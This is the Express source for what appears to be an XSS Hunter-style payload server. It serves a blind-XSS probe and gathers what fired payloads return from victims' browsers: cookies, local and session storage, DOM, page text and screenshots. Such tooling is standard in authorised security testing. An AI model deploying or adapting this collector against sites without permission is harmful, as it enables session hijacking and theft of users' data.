const bodyParser = require('body-parser');
const express = require('express');
const fs = require('fs');
const zlib = require('zlib');
const path = require('path');
const asyncfs = require('fs').promises;
const { v4: uuidv4 } = require('uuid');
const database = require('../shared/database.js');
const PayloadFireResults = database.PayloadFireResults;
const CollectedPages = database.CollectedPages;
const ProbeTokens = database.ProbeTokens;
const Payloads = database.Payloads;
const Settings = database.Settings;
const crypto = require('crypto');
const notification = require('../shared/utils/notification.js');
const validate = require('express-jsonschema').validate;
const constants = require('../shared/constants.js');
const multer = require('multer');
const upload = multer({ dest: '/tmp/' });

// Check if we're in development mode
const isDevelopment = process.env.DEV_MODE === 'true' || process.env.NODE_ENV === 'development';

// Load XSS payload from file into memory
const XSS_PAYLOAD = fs.readFileSync(
    path.join(__dirname, '../probe.js'),
    'utf8'
);

const SCREENSHOTS_DIR = path.resolve(process.env.SCREENSHOTS_DIR || '/tmp/xsshunter-screenshots');
const SCREENSHOT_FILENAME_REGEX = new RegExp(/^[0-9A-F]{8}-[0-9A-F]{4}-4[0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}\.png$/i);

async function check_file_exists(file_path) {
    return asyncfs.access(file_path, fs.constants.F_OK).then(() => {
        return true;
    }).catch(() => {
        return false;
    });
}

function set_payload_headers(req, res) {
    res.set("X-XSS-Protection", "mode=block");
    res.set("X-Content-Type-Options", "nosniff");
    res.set("X-Frame-Options", "deny");
}

async function get_app_server() {
    const app = express();

    // Set up error handlers
    process.on('unhandledRejection', (reason, promise) => {
        console.error('[Payload Server] Unhandled Promise Rejection:', reason);
    });

    process.on('uncaughtException', (error) => {
        console.error('[Payload Server] Uncaught Exception:', error);
        setTimeout(() => {
            process.exit(1);
        }, 1000);
    });

    app.set('case sensitive routing', true);
    
    app.use(bodyParser.json());
    app.use(bodyParser.urlencoded({ extended: true }));
    
    // Enforce lowercase paths
    app.use(async function(req, res, next) {
        if(req.path.toLowerCase() === req.path) {
            next();
            return;
        }
        res.status(401).json({
            "success": false,
            "error": "Only lowercase URLs are valid."
        }).end();
    });

    // Set security headers
    app.use(async function(req, res, next) {
        set_payload_headers(req, res);
        next();
    });

    // OPTIONS handler for CORS preflight requests for page_callback
    app.options('/page_callback', (req, res) => {
        res.set("Access-Control-Allow-Origin", "*");
        res.set("Access-Control-Allow-Methods", "POST, OPTIONS");
        res.set("Access-Control-Allow-Headers", "Content-Type, X-Requested-With");
        res.set("Access-Control-Max-Age", "86400");
        res.sendStatus(200);
    });

    // Handler for HTML pages collected by payloads
    const CollectedPagesCallbackSchema = {
        "type": "object",
        "properties": {
            "uri": {
                "type": "string",
                "default": ""
            },
            "html": {
                "type": "string",
                "default": "" 
            },
            "payload_id": {
                "type": "string",
                "required": true
            },
            "session_token": {
                "type": "string",
                "required": true
            }
        }
    };
    
    app.post('/page_callback', upload.none(), validate({body: CollectedPagesCallbackSchema}), async (req, res) => {
        res.set("Access-Control-Allow-Origin", "*");
        res.set("Access-Control-Allow-Methods", "POST, OPTIONS");
        res.set("Access-Control-Allow-Headers", "Content-Type, X-Requested-With");
        res.set("Access-Control-Max-Age", "86400");

        try {
            const { uri, html, payload_id, session_token } = req.body;
            
            // Validate required fields
            if (!payload_id || !session_token) {
                return res.status(400).json({ error: "Missing authentication" });
            }
            
            // Validate UUID format for payload_id
            const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
            if (!uuidRegex.test(payload_id)) {
                return res.status(400).json({ error: "Invalid payload ID format" });
            }
            
            // Validate session token format (64 char hex string)
            const tokenRegex = /^[0-9a-f]{64}$/i;
            if (!tokenRegex.test(session_token)) {
                return res.status(400).json({ error: "Invalid session token format" });
            }
            
            // Validate session token
            const probe_token = await ProbeTokens.findOne({
                where: {
                    payload_fire_id: payload_id,
                    session_token: session_token
                }
            });
            
            if (!probe_token) {
                console.log(`[Page callback] Invalid session token for payload ${payload_id}`);
                return res.status(401).json({ error: "Invalid session token" });
            }
            
            // Update last activity timestamp
            await probe_token.update({
                last_activity: new Date()
            });

            // Store the collected page with payload association
            const page_insert_response = await CollectedPages.create({
                id: uuidv4(),
                uri: uri || '',
                html: html || '',
            });

            // Send the response immediately
            res.status(200).json({
                "status": "success"
            }).end();
            
        } catch (error) {
            console.error('[Page callback] Error:', error);
            res.status(500).json({ error: "Internal server error" });
        }
    });

    // Handler for XSS payload data to be received
    const JSCallbackSchema = {
        "type": "object",
        "properties": {
            "probe_secret": {
                "type": "string",
                "required": true
            },
            "uri": {
                "type": "string",
                "default": ""
            },
            "cookies": {
                "type": "string",
                "default": ""
            },
            "referrer": {
                "type": "string",
                "default": ""
            },
            "user-agent": {
                "type": "string",
                "default": ""
            },
            "browser-time": {
                "type": "string",
                "default": "0",
                "pattern": "^\\d+$"
            },
            "probe-uid": {
                "type": "string",
                "default": ""
            },
            "origin": {
                "type": "string",
                "default": ""
            },
            "injection_key": {
                "type": "string",
                "default": ""
            },
            "title": {
                "type": "string",
                "default": ""
            },
            "text": {
                "type": "string",
                "default": ""
            },
            "was_iframe": {
                "type": "string",
                "default": "false",
                "enum": ["true", "false"]
            },
            "dom": {
                "type": "string",
                "default": ""
            },
            "localStorage": {
                "type": "string",
                "default": "[]"
            },
            "sessionStorage": {
                "type": "string",
                "default": "[]"
            },
            "custom_data": {
                "type": "string",
                "default": "[]"
            }
        }
    };

    // OPTIONS handler for CORS preflight requests for js_callback
    app.options('/js_callback', (req, res) => {
        res.set("Access-Control-Allow-Origin", "*");
        res.set("Access-Control-Allow-Methods", "POST, OPTIONS");
        res.set("Access-Control-Allow-Headers", "Content-Type, X-Requested-With");
        res.set("Access-Control-Max-Age", "86400");
        res.sendStatus(200);
    });

    app.post('/js_callback', upload.single('screenshot'), validate({body: JSCallbackSchema}), async (req, res) => {
        res.set("Access-Control-Allow-Origin", "*");
        res.set("Access-Control-Allow-Methods", "POST, OPTIONS");
        res.set("Access-Control-Allow-Headers", "Content-Type, X-Requested-With");
        res.set("Access-Control-Max-Age", "86400");

        try {
            // Validate probe secret
            const probe_secret = req.body.probe_secret;
            if (!probe_secret) {
                if (req.file && req.file.path) {
                    asyncfs.unlink(req.file.path).catch(err => 
                        console.error('[Cleanup] Failed to delete temp file:', err)
                    );
                }
                return res.status(401).json({ error: "Missing authentication" }).end();
            }

            // Check if probe secret exists and hasn't been used
            const probe_token = await ProbeTokens.findOne({
                where: { 
                    probe_secret: probe_secret,
                    used: false 
                }
            });

            if (!probe_token) {
                console.log(`Invalid or already used probe secret: ${probe_secret.substring(0, 10)}...`);
                // Clean up uploaded file if exists
                if (req.file && req.file.path) {
                    asyncfs.unlink(req.file.path).catch(err => 
                        console.error('[Cleanup] Failed to delete temp file:', err)
                    );
                }
                return res.status(401).json({ error: "Invalid authentication" }).end();
            }

            // Generate the payload_fire_id and session token
            const payload_fire_id = uuidv4();
            const session_token = crypto.randomBytes(32).toString('hex');

            // Mark probe secret as used and store session token with initial activity
            await probe_token.update({
                used: true,
                session_token: session_token,
                payload_fire_id: payload_fire_id,
                last_activity: new Date()
            });

            let multer_temp_image_path = false;
            // Process screenshot if provided
            if(req.file && req.file.path) {
                multer_temp_image_path = req.file.path;
            }

            const payload_fire_image_filename = payload_fire_id + ".png.gz";
            const payload_fire_image_filename_nongzip = payload_fire_id + ".png";

            // Build payload fire data
            const payload_fire_data = {
                id: payload_fire_id,
                url: req.body.uri,
                ip_address: req.connection.remoteAddress,
                referer: req.body.referrer,
                user_agent: req.body['user-agent'],
                cookies: req.body.cookies,
                title: req.body.title,
                dom: req.body.dom,
                text: req.body.text,
                screenshot_id: payload_fire_id,
                was_iframe: (req.body.was_iframe === "true"),
                browser_timestamp: parseInt(req.body['browser-time']),
                localStorage: req.body.localStorage,
                sessionStorage: req.body.sessionStorage,
                probe_uid: req.body['probe-uid'],
                origin: req.body.origin,
                custom_data: req.body.custom_data || "[]"
            };

            // Handle screenshot if present
            if(multer_temp_image_path) {
                const gzip = zlib.createGzip();
                const payload_fire_image_filename_path = `${SCREENSHOTS_DIR}/${payload_fire_image_filename}`;
                const output_gzip_stream = fs.createWriteStream(payload_fire_image_filename_path);
                const input_read_stream = fs.createReadStream(multer_temp_image_path);
                
                input_read_stream.pipe(gzip).pipe(output_gzip_stream).on('finish', async (error) => {
                    if(error) {
                        console.error(`An error occurred while writing the XSS payload screenshot:`, error);
                    }
                    
                    try {
                        await asyncfs.unlink(multer_temp_image_path);
                    } catch(unlinkError) {
                        console.error(`Failed to delete temp file: ${multer_temp_image_path}`, unlinkError);
                    }
                });
            }

            // Store payload fire results in the database
            const new_payload_fire_result = await PayloadFireResults.create(payload_fire_data);

            // Prepare screenshot URL for notifications
            payload_fire_data.screenshot_url = `https://${process.env.HOSTNAME}/screenshots/${payload_fire_data.screenshot_id}.png`;
            
            // Send email notification if SMTP is configured and email alerts are enabled
            if(process.env.SMTP_EMAIL_NOTIFICATIONS_ENABLED === "true") {
                // Check if email alerts are enabled in settings
                const email_alerts_setting = await Settings.findOne({
                    where: {
                        key: constants.SEND_ALERT_EMAILS_KEY
                    }
                });
                
                const send_email_alerts = email_alerts_setting ? 
                    JSON.parse(email_alerts_setting.value) : true; // Default to true if not set
                
                if(send_email_alerts) {
                    try {
                        await notification.send_email_notification(payload_fire_data);
                    } catch (emailError) {
                        console.error('[Notification] Failed to send email:', emailError);
                    }
                }
            }
            
            // Send Discord notification if webhook URL is configured and Discord alerts are enabled
            if(process.env.DISCORD_WEBHOOK_URL) {
                const discord_alerts_setting = await Settings.findOne({
                    where: {
                        key: constants.SEND_DISCORD_ALERTS_KEY
                    }
                });
                
                const send_discord_alerts = discord_alerts_setting ? 
                    JSON.parse(discord_alerts_setting.value) : true;
                
                if(send_discord_alerts) {
                    try {
                        await notification.send_discord_notification(payload_fire_data);
                    } catch (discordError) {
                        console.error('[Notification] Failed to send Discord notification:', discordError);
                    }
                }
            }

            // Return payload ID and session token for subsequent requests
            res.status(200).json({
                status: "success",
                payload_id: payload_fire_id,
                session_token: session_token
            }).end();

        } catch (error) {
            console.error('[JS Callback] Error:', error);
            res.status(500).json({ error: "Internal server error" });
        }
    });

    // OPTIONS handler for CORS preflight requests
    app.options('/background_callback', (req, res) => {
        res.set("Access-Control-Allow-Origin", "*");
        res.set("Access-Control-Allow-Methods", "POST, OPTIONS");
        res.set("Access-Control-Allow-Headers", "Content-Type, X-Requested-With");
        res.set("Access-Control-Max-Age", "86400");
        res.sendStatus(200);
    });

    // Background callback endpoint
    app.post('/background_callback', async (req, res) => {
        res.set("Access-Control-Allow-Origin", "*");
        res.set("Access-Control-Allow-Methods", "POST, OPTIONS");
        res.set("Access-Control-Allow-Headers", "Content-Type, X-Requested-With");
        res.set("Access-Control-Max-Age", "86400");
        
        try {
            const { payload_id, session_token, custom_data } = req.body;
            
            // Validate required fields
            if (!payload_id || !session_token || !custom_data) {
                return res.status(400).json({ error: "Missing required fields" });
            }
            
            // Validate UUID format for payload_id
            const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
            if (!uuidRegex.test(payload_id)) {
                console.error(`[Background callback] Invalid UUID format: ${payload_id}`);
                return res.status(400).json({ error: "Invalid payload ID format" });
            }
            
            // Validate session token format (64 char hex string)
            const tokenRegex = /^[0-9a-f]{64}$/i;
            if (!tokenRegex.test(session_token)) {
                console.error(`[Background callback] Invalid session token format`);
                return res.status(400).json({ error: "Invalid session token format" });
            }
            
            // Validate custom_data structure
            if (!custom_data || typeof custom_data !== 'object') {
                console.error(`[Background callback] Invalid custom_data structure`);
                return res.status(400).json({ error: "Invalid custom data format" });
            }
            
            // Validate session token
            let probe_token;
            try {
                probe_token = await ProbeTokens.findOne({
                    where: {
                        payload_fire_id: payload_id,
                        session_token: session_token
                    }
                });
            } catch (dbError) {
                console.error(`[Background callback] Database error looking up token:`, dbError.message);
                return res.status(500).json({ error: "Database error validating session" });
            }
            
            if (!probe_token) {
                console.log(`Invalid session token for payload ${payload_id}`);
                return res.status(401).json({ error: "Invalid session token" });
            }
            
            // Update last activity timestamp for session management
            try {
                await probe_token.update({
                    last_activity: new Date()
                });
            } catch (updateError) {
                console.error(`[Background callback] Failed to update last_activity:`, updateError.message);
            }
            
            // Find the original payload fire by ID
            let original_fire;
            try {
                original_fire = await PayloadFireResults.findOne({
                    where: { id: payload_id }
                });
            } catch (dbError) {
                console.error(`[Background callback] Database error looking up payload:`, dbError.message);
                return res.status(500).json({ error: "Database error retrieving payload" });
            }
            
            if (!original_fire) {
                return res.status(404).json({ error: "Original payload fire not found" });
            }
            
            // Parse and merge custom data
            let existing_data = [];
            try {
                existing_data = JSON.parse(original_fire.custom_data || '[]');
            } catch (e) {
                console.error('[Background callback] Failed to parse existing custom_data:', e);
                existing_data = [];
            }
            
            // Add timestamp to the new data
            const timestamped_data = {
                ...custom_data,
                timestamp: new Date().toISOString()
            };
            
            // Append new data to existing
            existing_data.push(timestamped_data);
            
            // Update the payload fire with new custom data
            try {
                await original_fire.update({
                    custom_data: JSON.stringify(existing_data)
                });
                
                console.log(`[Background callback] Updated payload ${payload_id} with new custom data`);
                
                res.status(200).json({ 
                    status: "success",
                    message: "Background data received and stored"
                });
            } catch (updateError) {
                console.error(`[Background callback] Failed to update payload fire:`, updateError.message);
                return res.status(500).json({ error: "Failed to store background data" });
            }
            
        } catch (error) {
            console.error('[Background callback] Unexpected error:', error);
            res.status(500).json({ error: "Internal server error" });
        }
    });

    // Payload handler - serves the XSS probe
    async function payload_handler(req, res) {
        // Set headers
        res.set('Content-Type', 'application/javascript');
        res.set('Access-Control-Allow-Origin', '*');
        res.set('Access-Control-Allow-Methods', 'GET, OPTIONS');
        res.set('Access-Control-Allow-Headers', 'Content-Type');
        
        const probe_id = req.params.probe_id || 'default';
        
        let probe_secret;
        try {
            // Generate a unique probe secret for this payload request
            probe_secret = crypto.randomBytes(32).toString('hex'); // 64 character hex string
            const request_ip = (req.connection.remoteAddress && req.connection.remoteAddress.toString()) || req.ip;
            
            // Store the probe secret for later validation
            // Retry up to 3 times in case of UUID collision
            let attempts = 0;
            let tokenCreated = false;
            
            while (!tokenCreated && attempts < 3) {
                try {
                    await ProbeTokens.create({
                        id: uuidv4(), // Explicitly generate UUID to control retries
                        probe_secret: probe_secret,
                        used: false,
                        request_ip: request_ip
                    });
                    tokenCreated = true;
                } catch (error) {
                    attempts++;
                    if (error.name === 'SequelizeUniqueConstraintError' && attempts < 3) {
                        console.log(`[ProbeToken] UUID collision, retrying (attempt ${attempts + 1})...`);
                        // Generate new probe_secret if that was the collision
                        if (error.fields && error.fields.probe_secret) {
                            probe_secret = crypto.randomBytes(32).toString('hex');
                        }
                        // UUID will be regenerated on next attempt
                    } else {
                        throw error;
                    }
                }
            }
            
            if (!tokenCreated) {
                throw new Error('Failed to create probe token after 3 attempts');
            }
        } catch (error) {
            console.error('[Payload Handler] Error creating probe token:', error);
            // Return a basic payload without authentication
            return res.status(500).send('// Error generating payload - please try again');
        }
        
        // Fetch configuration from database
        const db_promises = [
            Settings.findOne({
                where: {
                    key: constants.PAGES_TO_COLLECT_SETTINGS_KEY,
                }
            }),
            Settings.findOne({
                where: {
                    key: constants.CHAINLOAD_URI_SETTINGS_KEY,
                }
            }),
            Payloads.findAll({
                where: {
                    is_active: true
                },
                attributes: ['code', 'minified_code'],
                order: [['created_at', 'ASC']]
            })
        ];
        
        const db_results = await Promise.all(db_promises);
        const pages_to_collect = (db_results[0] === null) ? [] : JSON.parse(db_results[0].value);
        const chainload_uri = (db_results[1] === null) ? '' : db_results[1].value;
        // Use minified_code if available, otherwise fallback to base64 encoding the original code
        const active_payloads = (db_results[2] || []).map(p => {
            if (p.minified_code) {
                return p.minified_code;
            } else {
                // Fallback for existing payloads without minified_code
                return Buffer.from(p.code).toString('base64');
            }
        });
        
        // Determine protocol based on environment
        const protocol = isDevelopment ? 'http' : 'https';
        
        res.send(XSS_PAYLOAD.replace(
            /\[HOST_URL\]/g,
            `${protocol}://${process.env.HOSTNAME}`
        ).replace(
            '[COLLECT_PAGE_LIST_REPLACE_ME]',
            JSON.stringify(pages_to_collect)
        ).replace(
            '[CHAINLOAD_REPLACE_ME]',
            JSON.stringify(chainload_uri)
        ).replace(
            '[PROBE_SECRET]',
            probe_secret
        ).replace(
            '[PROBE_ID]',
            JSON.stringify(probe_id)
        ).replace(
            '[CUSTOM_PAYLOADS_REPLACE_ME]',
            JSON.stringify(active_payloads)
        ));
    }

    // OPTIONS handler for CORS preflight requests for probe
    app.options('/', (req, res) => {
        res.set("Access-Control-Allow-Origin", "*");
        res.set("Access-Control-Allow-Methods", "GET, OPTIONS");
        res.set("Access-Control-Allow-Headers", "Content-Type");
        res.sendStatus(200);
    });
    
    app.options('/:probe_id', (req, res) => {
        res.set("Access-Control-Allow-Origin", "*");
        res.set("Access-Control-Allow-Methods", "GET, OPTIONS");
        res.set("Access-Control-Allow-Headers", "Content-Type");
        res.sendStatus(200);
    });

    // Root and probe ID routes
    app.get('/', payload_handler);
    app.get('/:probe_id', payload_handler);

    // Global error handler
    app.use((err, req, res, next) => {
        console.error('[Payload Server Error]:', err);
        
        if (res.headersSent) {
            return;
        }
        
        res.status(err.status || 500).json({
            error: 'Internal server error',
            message: process.env.NODE_ENV === 'development' ? err.message : 'An error occurred'
        });
    });

    return app;
}

module.exports = get_app_server;